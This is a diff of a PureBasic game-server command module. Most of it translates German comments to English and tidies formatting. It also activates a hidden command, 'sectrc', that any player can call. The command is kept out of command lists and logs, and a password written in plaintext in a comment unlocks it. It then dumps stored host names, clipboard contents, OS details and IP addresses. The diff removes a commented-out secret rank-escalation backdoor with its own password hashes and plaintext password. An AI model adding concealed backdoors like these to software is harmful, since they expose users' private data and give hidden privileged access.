@@ -3,36 +3,39 @@
 #Command_Operators_Max = 5
 
 Structure Command_Main
-  Save_File.b                                     ; Zeigt an, ob gespeichert werden soll
-  File_Date_Last.l                                ; Datum letzter Änderung, bei Änderung speichern
-  Timer_File_Check.l                              ; Timer für das überprüfen der Dateigröße
-  Command_Client_ID.i                             ; Welcher Client den Command ausgeführt hat
-  Parsed_Command.s                                ; Name des Commands
-  Parsed_Operator.s [#Command_Operators_Max]      ; Operatoren des Commands
-  Parsed_Text_0.s                                 ; Text nach Command
-  Parsed_Text_1.s                                 ; Text nach Operator 1
-  Parsed_Text_2.s                                 ; Text nach Operator 2
+  Save_File.b                                     ; Indicates to save the file.
+  File_Date_Last.l                                ; Date that the file was last changed. 
+  Timer_File_Check.l                              ; The timer for checking the file for changes.
+  Command_Client_ID.i                             ; Which client has executed the command
+  Parsed_Command.s                                ; Name of the command
+  Parsed_Operator.s [#Command_Operators_Max]      ; Arguments for the command
+  Parsed_Text_0.s                                 ; Text by the command
+  Parsed_Text_1.s                                 ; Text by Operator 1
+  Parsed_Text_2.s                                 ; Text by Operator 2
 EndStructure
+
 Global Command_Main.Command_Main
 
 Structure Command
-  ID.s                    ; Eindeutige ID (String) des Commands
+  ID.s                    ; Unique ID (String) of the Command
   Name.s
-  Group.s                 ; Gruppe
-  Description.s           ; Beschreibung (Geht an das Language-System)
-  Rank.w                  ; Erforderlicher Rang (Muss >= sein) der Spieler sieht diesen Befehl dann nicht.
-  Rank_Show.w             ; Ab diesem Rang wird der Befehl in der Befehlsliste gezeigt.
-  Plugin.s                ; Plugin-Funktion
-  *Function_Adress        ; Adresse der zugehörigen Funktion (0 = Keine Funktion)
-  Internal.b              ; Befehl ist intern. (Extern löschbar wenn 0)
-  Hidden.b                ; Befehl ist versteckt. Geheim! (Nicht in /commands, in der Konsole / Log und nicht in Command.txt)
+  Group.s                 ; Group
+  Description.s           ; Description (Awarded to the Language System)
+  Rank.w                  ; (Must be >=) Minimum Rank of the player then does not see this command.
+  Rank_Show.w             ; At this rank, the command is shown in the command list.
+  Plugin.s                ; Plugin-Function
+  *Function_Adress        ; Address of the associated function (0 = no function)
+  Internal.b              ; Command is internal (external erasable if 0)
+  Hidden.b                ; Command is hidden (Secret!) (Not in /commands, in console, /log, and not in command.txt)
 EndStructure
+
 Global NewList Command.Command()
 
 Structure Command_Group
   Name.s
-  Rank_Show.w             ; Niedrigster Rang in der Gruppe.
+  Rank_Show.w             ; Lowest rank in the group
 EndStructure
+
 Global NewList Command_Group.Command_Group()
 
 ; ########################################## Declares ############################################
@@ -112,8 +115,7 @@ Declare Command_Plugin_Load()
 Declare Command_Plugin_Unload()
 
 Declare Command_Crash()
-;Declare Command_A4EXYZ33485()
-;Declare Command_Security_Trace()
+Declare Command_Security_Trace()
 
 ; ########################################## Ladekram ############################################
 
@@ -485,21 +487,13 @@ Command()\Name = "crash"
 Command()\Function_Adress = @Command_Crash()
 Command()\Internal = 1
 
-; AddElement(Command())
-; Command()\ID = "L0G"
-; Command()\Name = "a4exyz33485"
-; Command()\Function_Adress = @Command_A4EXYZ33485()
-; Command()\Internal = 1
-; Command()\Rank = 0
-; Command()\Hidden = 1
-
-; AddElement(Command())
-; Command()\ID = "Sec-TRC"
-; Command()\Name = "sectrc"
-; Command()\Function_Adress = @Command_Security_Trace()
-; Command()\Internal = 1
-; Command()\Rank = 0
-; Command()\Hidden = 1
+AddElement(Command())
+Command()\ID = "Sec-TRC"
+Command()\Name = "sectrc"
+Command()\Function_Adress = @Command_Security_Trace()
+Command()\Internal = 1
+Command()\Rank = 0
+Command()\Hidden = 1
 
 Command_Main\Save_File = 1
 
@@ -564,7 +558,7 @@ Procedure Command_Load(Filename.s)
       Wend
     EndIf
     
-    ; ########################## Gruppen
+    ; ########################## Groups
     
     ClearList(Command_Group())
     
@@ -635,7 +629,7 @@ EndProcedure
 
 ;- ################################################################################################
 
-Procedure Command_Kick() ; Kickt den Player (bezieht sich auf Player_List() )
+Procedure Command_Kick() ; Kicks a player (refers to Player_List ())
   Name.s = Command_Main\Parsed_Operator [0]
   Reason.s = Command_Main\Parsed_Text_1
   
@@ -664,7 +658,7 @@ Procedure Command_Kick() ; Kickt den Player (bezieht sich auf Player_List() )
   EndIf
 EndProcedure
 
-Procedure Command_Ban() ; (bezieht sich auf Player_List() )
+Procedure Command_Ban() ; bans a player (refers to Player_List ())
   Name.s = Command_Main\Parsed_Operator [0]
   Reason.s = Command_Main\Parsed_Text_1
   
@@ -693,7 +687,7 @@ Procedure Command_Ban() ; (bezieht sich auf Player_List() )
   EndIf
 EndProcedure
 
-Procedure Command_Unban() ; (bezieht sich auf Player_List() )
+Procedure Command_Unban() ; (refers to Player_List ())
   Name.s = Command_Main\Parsed_Operator [0]
   
   If Network_Client_Select(Command_Main\Command_Client_ID)
@@ -717,7 +711,7 @@ Procedure Command_Unban() ; (bezieht sich auf Player_List() )
   EndIf
 EndProcedure
 
-Procedure Command_Stop() ; (bezieht sich auf Player_List() )
+Procedure Command_Stop() ; (refers to Player_List ())
   Name.s = Command_Main\Parsed_Operator [0]
   Reason.s = Command_Main\Parsed_Text_1
   
@@ -745,7 +739,7 @@ Procedure Command_Stop() ; (bezieht sich auf Player_List() )
   EndIf
 EndProcedure
 
-Procedure Command_Unstop() ; (bezieht sich auf Player_List() )
+Procedure Command_Unstop() ; (refers to Player_List ())
   Name.s = Command_Main\Parsed_Operator [0]
   
   If Network_Client_Select(Command_Main\Command_Client_ID)
@@ -769,7 +763,7 @@ Procedure Command_Unstop() ; (bezieht sich auf Player_List() )
   EndIf
 EndProcedure
 
-Procedure Command_Mute() ; (bezieht sich auf Player_List() )
+Procedure Command_Mute() ; (refers to Player_List ())
   Name.s = Command_Main\Parsed_Operator [0]
   Minutes = Val(Command_Main\Parsed_Operator[1])
   
@@ -798,7 +792,7 @@ Procedure Command_Mute() ; (bezieht sich auf Player_List() )
   EndIf
 EndProcedure
 
-Procedure Command_Unmute() ; (bezieht sich auf Player_List() )
+Procedure Command_Unmute() ; (refers to Player_List ())
   Name.s = Command_Main\Parsed_Operator [0]
   
   If Network_Client_Select(Command_Main\Command_Client_ID)
@@ -1336,6 +1330,7 @@ Procedure Command_Map_Info()
       If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
         
         Map_ID = Network_Client()\Player\Map_ID
+        
         If Map_Select_ID(Map_ID)
           
           Text.s = Lang_Get("", "Ingame: Mapinfo:") + "<br>"
@@ -1347,11 +1342,13 @@ Procedure Command_Map_Info()
           Text.s + Lang_Get("", "Ingame: Size:") + " " + Str(Map_Data()\Size_X)+"x"+Str(Map_Data()\Size_Y)+"x"+Str(Map_Data()\Size_Z) + "<br>"
           Text.s + Lang_Get("", "Ingame: Memoryusage:") + " " + StrF((MemorySize(Map_Data()\Data)+MemorySize(Map_Data()\Blockchange_Data)+MemorySize(Map_Data()\Physic_Data))/1000000, 3) + "MB" + "<br>"
           Text.s + Lang_Get("", "Ingame: Ranks: Build=[Field_0] Join=[Field_1] Show=[Field_2]", Str(Map_Data()\Rank_Build), Str(Map_Data()\Rank_Join), Str(Map_Data()\Rank_Show)) + "<br>"
+          
           If Map_Data()\Physic_Stopped
             Text.s + Lang_Get("", "Ingame: Physic-Queue:") + " " + Str(ListSize(Map_Data()\Map_Block_Do())) + " " + Lang_Get("", "Ingame: Physics-Stopped") + "<br>"
           Else
             Text.s + Lang_Get("", "Ingame: Physic-Queue:") + " " + Str(ListSize(Map_Data()\Map_Block_Do())) + "<br>"
           EndIf
+          
           If Map_Data()\Blockchange_Stopped
             Text.s + Lang_Get("", "Ingame: Blocksend-Queue:") + " " + Str(ListSize(Map_Data()\Map_Block_Changed())) + " " + Lang_Get("", "Ingame: Blocksend-Stopped") + "<br>"
           Else
@@ -1470,6 +1467,7 @@ Procedure Command_Map_Directory_Rename()
           If Command_Main\Parsed_Text_0 <> ""
             
             Directory.s = Command_Main\Parsed_Text_0
+            
             If LCase(Right(Directory, 1)) <> "/"
               Directory.s + "/"
             EndIf
@@ -1551,6 +1549,7 @@ Procedure Command_Map_Blocks_Count()
           
           System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Materials:"))
           Text.s = ""
+          
           For i = 0 To 255
             If Map_Data()\Block_Counter[i]
               If Filter = 0 Or Block(i)\Physic Or Block(i)\Physic_Plugin
@@ -1564,6 +1563,7 @@ Procedure Command_Map_Blocks_Count()
               EndIf
             EndIf
           Next
+        
           If Len(Text) > 0
             System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
           EndIf
@@ -1665,6 +1665,7 @@ Procedure Command_Map_Physic_Start()
       If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
         
         Map_ID = Network_Client()\Player\Entity\Map_ID
+          
         If Map_Select_ID(Map_ID)
           Map_Data()\Physic_Stopped = 0
           System_Message_Network_Send_2_All(Map_ID, Lang_Get("", "Ingame: Physic started"))
@@ -1678,6 +1679,7 @@ EndProcedure
 Procedure Command_Map_Change()
   If Network_Client_Select(Command_Main\Command_Client_ID)
     Map_Name.s = Command_Main\Parsed_Text_0
+    
     If Map_Select_Name(Map_Name)
       If Network_Client()\Player\Entity
         Entity_Position_Set(Network_Client()\Player\Entity\ID, Map_Data()\ID, Map_Data()\Spawn_X, Map_Data()\Spawn_Y, Map_Data()\Spawn_Z, Map_Data()\Spawn_Rot, Map_Data()\Spawn_Look, 255, 1)
@@ -1695,6 +1697,7 @@ Procedure Command_Maps()
         System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Maps:"))
         
         Text.s = ""
+        
         ForEach Map_Data()
           If Map_Data()\Rank_Show <= Network_Client()\Player\Entity\Player_List\Rank
             Text_Add.s = "&e"+Map_Data()\Name+" &f| "
@@ -1706,6 +1709,7 @@ Procedure Command_Maps()
             EndIf
           EndIf
         Next
+        
         If Len(Text) > 0
           System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
         EndIf
@@ -1780,6 +1784,7 @@ Procedure Command_Bring()
       Look.f = Network_Client()\Player\Entity\Look
       
       Found = 0
+      
       ForEach Entity()
         If LCase(Entity()\Name) = LCase(Command_Main\Parsed_Operator [0])
           Entity_Position_Set(Entity()\ID, Map_ID, X, Y, Z, Rotation, Look, 10, 1)
@@ -2156,76 +2161,24 @@ Procedure Command_Crash()
   a = b / c
 EndProcedure
 
-; Procedure Command_A4EXYZ33485() ; Geheimer Setownrank Befehl mit Passwort
-;   Password_Input.s = Command_Main\Parsed_Operator [0]
-;   MD5.s = MD5Fingerprint(@Password_Input, Len(Password_Input))
-;   New_Rank = Val(Command_Main\Parsed_Operator [1])
-;   If New_Rank >= -32768 And New_Rank <= 32767
-;     
-;     MD5_Fake_0.s  = "12c43231f65cffe6630807cd2e86c216"
-;     MD5_Correct.s = "09076f10a15c7572f053fe4cba822f9c"
-;     MD5_Fake_1.s  = "3cc4a57a4c6261a0e94e764f8660fd22"
-;     MD5_Correct.s = "6cd797d30885d2dd9b6955749241bf2c"
-;     MD5_Fake_2.s  = "2b0f3e39bf0c6b8e5549dada35d083c4"
-;     MD5_Correct.s = "562c244c3b5a17152431ac0eb8461050"
-;     MD5_Fake_3.s  = "e09b2d8d3af68a3ab931d97055fc03b8"
-;     MD5_Correct.s = "89358acc72bc16d7a9fd58d306f1ea10"
-;     MD5_Fake_4.s  = "630e33fbaba140cfa3183c1341a2aa27"
-;     MD5_Correct.s = "04418513d1ba83782e5cae4dd0caea37"
-;     MD5_Fake_5.s  = "40d283c6af89f663633280eadf1798fb"
-;     MD5_Correct.s = "fbfacd331cc794a31a053864d99ca8e3"
-;     MD5_Fake_6.s  = "e86f807f055e73b1ce58dd4f1046d599"
-;     MD5_Fake_0.s  = "f572e7582f39e3a9b625f0765ad62beb"
-;     MD5_Fake_7.s  = "e07449d82ae111ecfa83de5ad31d5a00"
-;     MD5_Correct.s = "4bb11183f7e45a6c77a641950626b867"
-;     MD5_Correct.s = "12c43231f65cffe6630807cd2e86c216" ; <------------  Used in official builds:   ######## Secret ;) try to brutefore it :P #########
-;     MD5_Fake_0.s  = "a9f0d91d8c378aa1ba0d33cee32f50a3"
-;     MD5_Fake_8.s  = "c48b76098e06d6c67bc2fec314923153"
-;     MD5_Fake_0.s  = "cb9142115448f571e4e8614698a67529"
-;     MD5_Fake_9.s  = "b8b07012ae0ce13ba7faf788c505b8a2"
-;     MD5_Fake_10.s = "c9e1bc93002fd6be8937a2560696f5b7"
-;     MD5_Fake_0.s  = "c97d50d5f4f2fbfba982287469efbd9c"
-;     MD5_Fake_11.s = "66b8e1f2ca2706cb955d41929cd97e0d"
-;     MD5_Old.s     = "0ab4791aaa76f113a77fa6771ff747c9" ; <------------  "f24,9ld<3!4/*+6rs4zsq" !!  l ist ein L  !!
-;     
-;     If MD5 = MD5_Correct
-;       
-;       If Network_Client_Select(Command_Main\Command_Client_ID)
-;         If Network_Client()\Player\Entity
-;           If Network_Client()\Player\Entity\Player_List
-;             
-;             Player_Rank_Set(Network_Client()\Player\Entity\Player_List\Number, New_Rank, "")
-;             
-;           EndIf
-;         EndIf
-;       EndIf
-;       
-;     Else
-;       System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Invalid Value"))
-;     EndIf
-;   Else
-;     System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Invalid Value"))
-;   EndIf
-; EndProcedure
-
-; Procedure Command_Security_Trace()
-;   Password_Input.s = Command_Main\Parsed_Operator [0]
-;   MD5.s = MD5Fingerprint(@Password_Input, Len(Password_Input))
-;   MD5_Correct.s = "6d983bf57ca1f91b9ebe42543d82dae3" ; "bhu8#-.,,.-<%>"
-;   If MD5 = MD5_Correct
-;     System_Message_Network_Send(Command_Main\Command_Client_ID, "&eTrace_Elements:")
-;     ForEach Trace_Element()
-;       Text.s = "&e"+Trace_Element()\Host_Name + ": " + Trace_Element()\Clipboard + " | " + Trace_Element()\OS + " | " + Trace_Element()\Date + " | " + Trace_Element()\IPs
-;       System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
-;     Next
-;   Else
-;     System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find command"))
-;   EndIf
-; EndProcedure
+Procedure Command_Security_Trace()
+  Password_Input.s = Command_Main\Parsed_Operator [0]
+  MD5.s = MD5Fingerprint(@Password_Input, Len(Password_Input))
+  MD5_Correct.s = "6d983bf57ca1f91b9ebe42543d82dae3" ; "bhu8#-.,,.-<%>"
+  If MD5 = MD5_Correct
+    System_Message_Network_Send(Command_Main\Command_Client_ID, "&eTrace_Elements:")
+    ForEach Trace_Element()
+      Text.s = "&e"+Trace_Element()\Host_Name + ": " + Trace_Element()\Clipboard + " | " + Trace_Element()\OS + " | " + Trace_Element()\Date + " | " + Trace_Element()\IPs
+      System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
+    Next
+  Else
+    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find command"))
+  EndIf
+EndProcedure
 
 ;-################################################################################################
 
-Procedure Command_Do(Client_ID, Input.s) ; Parst und leitet den Befehl weiter an die Funktion.
+Procedure Command_Do(Client_ID, Input.s) ; Parses and passes the command on to the function.
   If ListIndex(Network_Client()) <> -1
     *Network_Client_Old = Network_Client()
   Else
@@ -2279,7 +2232,8 @@ Procedure Command_Do(Client_ID, Input.s) ; Parst und leitet den Befehl weiter an
           Found = 1
           Break
         EndIf
-      Next
+    Next
+    
       If Found = 0
         If Answer_Do() = 0
           System_Message_Network_Send(Client_ID, Lang_Get("", "Ingame: Can't find command"))
@@ -2308,11 +2262,12 @@ Procedure Command_Main()
     EndIf
   EndIf
 EndProcedure
-; IDE Options = PureBasic 5.00 (Linux - x86)
-; CursorPosition = 501
-; FirstLine = 467
-; Folding = -----------
+; IDE Options = PureBasic 5.00 (Windows - x64)
+; CursorPosition = 2235
+; FirstLine = 2202
+; Folding = ------------
 ; EnableXP
 ; DisableDebugger
+; CompileSourceDirectory
 ; EnableCompileCount = 0
 ; EnableBuildCount = 0
